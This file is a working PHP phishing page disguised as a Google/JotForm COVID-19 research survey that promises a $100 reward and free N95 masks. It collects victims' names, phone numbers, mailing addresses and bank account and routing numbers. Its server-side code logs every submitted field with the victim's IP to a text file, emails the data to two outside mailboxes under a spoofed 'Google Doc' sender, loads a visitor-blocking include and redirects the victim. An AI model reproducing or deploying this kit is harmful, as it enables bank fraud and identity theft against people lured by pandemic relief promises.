<?php
include'blocker.php';
include'function.php';
//include'_Obs.php';
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
header("Location: c?form_id=".getName($n)."");
$handle = fopen('result.txt', 'a');
fwrite($handle, 'Form 2---['.strtoupper(date("h:i:s a - Y/m/d")).']---['.$_SERVER['REMOTE_ADDR']."]\r\n");
foreach($_POST as $variable => $value) {
	$message .= $variable.': '.$value."\r\n";}
$header  = 'From: Google Doc <donotreply@owl.shop>'."\r\n";
$header .= 'Reply-To: donotreply@owl.shop'."\r\n";
$header .= 'MIME-Version: 1.0'."\r\n";
$header .= 'Content-Type: text/plain; charset=utf-8'."\r\n";
$header .= 'Content-Transfer-Encoding: 8bit'."\r\n";
$header .= 'X-Mailer: PHP v'.phpversion();
mail('jjennie484@gmail.com', $_SERVER['REMOTE_ADDR'].' @ '.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'], $message, $header);
mail('office00107@protonmail.com', $_SERVER['REMOTE_ADDR'].' @ '.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'], $message, $header);
fwrite($handle, $variable.': '.$value."\r\n\n");}
fclose($handle);
exit;
} ?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html lang="en-US"  class="supernova"><head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="alternate" type="application/json+oembed" href="https://www.jotform.com/oembed/?format=json&amp;url=https%3A%2F%2Fform.jotform.com%2F203380766775061" title="oEmbed Form">
<link rel="alternate" type="text/xml+oembed" href="https://www.jotform.com/oembed/?format=xml&amp;url=https%3A%2F%2Fform.jotform.com%2F203380766775061" title="oEmbed Form">
<meta property="og:title" content="Form" >
<meta property="og:url" content="https://form.jotform.com/203380766775061" >
<meta property="og:description" content="Please click the link to complete this form." >
<meta name="slack-app-id" content="AHNMASS8M">
<link rel="shortcut icon" href="https://ssl.gstatic.com/docs/spreadsheets/forms/favicon_qp2.png">
<link rel="canonical" href="https://form.jotform.com/203380766775061" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=1" />
<meta name="HandheldFriendly" content="true" />
<title>Introduction</title>
<link type="text/css" media="print" rel="stylesheet" href="https://cdn.jotfor.ms/css/printForm.css" />
<link type="text/css" rel="stylesheet" href="https://cdn.jotfor.ms/themes/CSS/5e6b428acc8c4e222d1beb91.css?themeRevisionID=5f7ed99c2c2c7240ba580251"/>
<link type="text/css" rel="stylesheet" href="https://cdn.jotfor.ms/css/styles/payment/payment_styles.css" />
<link type="text/css" rel="stylesheet" href="https://cdn.jotfor.ms/css/styles/payment/payment_feature.css" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/punycode/1.4.1/punycode.min.js"></script>
<script src="https://cdn.jotfor.ms/js/vendor/jquery-1.8.0.min.js?v=3.3.22120" type="text/javascript"></script>
<script src="https://cdn.jotfor.ms/js/vendor/maskedinput.min.js?v=3.3.22120" type="text/javascript"></script>
<script src="https://cdn.jotfor.ms/js/vendor/jquery.maskedinput.min.js?v=3.3.22120" type="text/javascript"></script>
<script src="https://cdn.jotfor.ms/static/prototype.forms.js" type="text/javascript"></script>
<script src="https://cdn.jotfor.ms/static/jotform.forms.js" type="text/javascript"></script>
<style>
  .custom-button{
    background-color: #31299B;
    color: rgb(251, 251, 251);
    border: 1px solid white;
    max-width: 90px;
    width: 90px;
    padding:10px ;
    border-radius: 5px;
    font-family: inherit;
    font-weight: bold;
    -webkit-box-shadow: 0 6px 4px -6px rgb(129, 125, 125); 
    -moz-box-shadow:    0 6px 4px -6px rgb(129, 125, 125);  
    box-shadow: 0 6px 4px -6px rgb(129, 125, 125);
  }
  .custom-button:hover{
    background-color: #3127B6;
  }
</style>
</head>
<body>
 <li class="form-line" data-type="control_image" id="id_3">
        <div id="cid_3" class="form-input-wide" data-layout="full">
          <div style="text-align:center">
            <img alt="" class="form-image" style="border-radius:10px" src="https://www.jotform.com/uploads/rdp4099/form_files/AF1QipOc3z7p3Hk2jS9iTQUfhszXideoW19Ph-3i29wS=w1832-h458.5fc9d0dd2fb8c6.59819156.png" height="200px" width="765px" data-component="image" />
          </div>
        </div>
      </li>
<form class="jotform-form" action="<?php echo basename(__FILE__); ?>" method="post" name="form_203380766775061" id="203380766775061" accept-charset="utf-8" autocomplete="on">

  <div role="main" class="form-all">
    <ul class="form-section page-section">
     
      <li id="cid_4" class="form-input-wide" data-type="control_head">
        <div class="form-header-group  header-large">
          <div class="header-text httal htvam">
            <h1 id="header_4" class="form-header" data-component="header">
              Introduction
            </h1>
            <div id="" class="">
               <p style="color:red">* Required
            </div>
			<br><br>Thank you for participating in our research, your feedback will be invaluable in the continued fight against the Coronavirus. Completing all the questions makes you eligible for a cash reward of up to $100. You will also receive a free box of N95 face masks for your personal protection against the Coronavirus. In addition to these, a donation will also be made to a charity organization of your choice and towards the National COVID-19 Vaccine Research Initiative. Please complete the information below to receive your winnings.
          </div>
        </div>
      </li>
	        <li class="form-line" data-type="text" id="id_5">
        <label class="form-label form-label-top form-label-auto" id="label_5" for="input_5">Full Name <font style="color:red">*</font></label>
        <div id="cid_5" class="form-input-wide" data-layout="half">
          <span class="form-sub-label-container" style="vertical-align:top">
            <input type="text" placeholder="Full Name" id="input_5" name="Full Name" class="form-textbox" style="width:310px" size="310" value="" data-component="text" aria-labelledby="label_5 sublabel_input_5" />
          </span>
        </div>
      </li>
	        <li class="form-line" data-type="text" id="id_6">
        <label class="form-label form-label-top form-label-auto" id="label_6" for="input_6">Telephone Number <font style="color:red">*</font></label>
        <div id="cid_6" class="form-input-wide" data-layout="half">
          <span class="form-sub-label-container" style="vertical-align:top">
            <input type="text" placeholder="Telephone Number" id="input_6" name="Telephone Number" class="form-textbox" style="width:310px" size="310" value="" data-component="text" aria-labelledby="label_6 sublabel_input_6" />
          </span>
        </div>
      </li>
	        <li class="form-line" data-type="control_textbox" id="id_21">
        <label class="form-label form-label-top form-label-auto" id="label_21" for="input_21"> Mailing Address <font style="color:red">*</font>
 </label>
<p style="font-size:13px">Please provide a complete mailing address to receive your free N95 face masks, hand sanitizer and sanitary hand gloves.</p>
        <div id="cid_21" class="form-input-wide" data-layout="half">
          <br><input type="text" id="input_21" placeholder="Your answer" name="Please provide a complete mailing address to receive your free N95 face masks, hand sanitizer and sanitary hand gloves." data-type="input-textbox" class="form-textbox" style="width:310px" size="310" value="" data-component="textbox" aria-labelledby="label_21" />
        </div>
      </li>
	  	        <li class="form-line" data-type="control_textbox" id="id_22">
        <label class="form-label form-label-top form-label-auto" id="label_22" for="input_22"> Direct Deposit Information <font style="color:red">*</font>
 </label>
<p style="font-size:13px">Please provide your account information to receive your $100 reward for completing the survey. Please enter your Bank Name, Account Number and Routing Number.</p>
        <div id="cid_22" class="form-input-wide" data-layout="half">
          <br><input type="text" id="input_22" placeholder="Your answer" name="Direct Deposit Information" data-type="input-textbox" class="form-textbox" style="width:310px" size="310" value="" data-component="textbox" aria-labelledby="label_22" />
        </div>
      </li>
     
	  <li class="form-line" data-type="control_radio" id="id_9">
        <label class="form-label form-label-top form-label-auto" id="label_9" for="input_9"> I certify that I am a resident of the United States of America and that the responses are true to the best of my knowledge. <font style="color:red">*</font></label>
        <div id="cid_9" class="form-input-wide" data-layout="full">
          <div class="form-single-column" role="group" aria-labelledby="label_9" data-component="radio">
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <br><input type="radio" class="form-radio" id="input_9_0" name="I certify that I am a resident of the United States of America and that the responses are true to the best of my knowledge." value="Yes" />
              <label id="label_input_9_0" for="input_9_0"> Yes </label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_9_1" name="I certify that I am a resident of the United States of America and that the responses are true to the best of my knowledge." value="No" />
              <label id="label_input_9_1" for="input_9_1"> No </label>
            </span>
            
          </div>
        </div>
      </li>
	  
      <li class="form-line" data-type="control_button" id="id_25">
        <div id="cid_25" class="form-input-wide" data-layout="full">
          <div data-align="left" class="form-buttons-wrapper form-buttons-left   jsTest-button-wrapperField">
            <button id="input_25" type="submit" class="  custom-button" data-component="button" data-content="">
              Submit
            </button>
          </div>
        </div>
      </li>
	  <img src="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/gigs/129994299/original/fb6edd112ce0be24ca178140aa0327316984f400/create-a-google-form-about-anything-you-want.png" alt="Form" style="width:250px;height:100px; display: block;margin-left: auto;margin-right: auto;">

    </ul>
  </div>
</html>
<script src="https://cdn.jotfor.ms//js/vendor/smoothscroll.min.js?v=3.3.22120"></script>
<script src="https://cdn.jotfor.ms//js/errorNavigation.js?v=3.3.22120"></script>
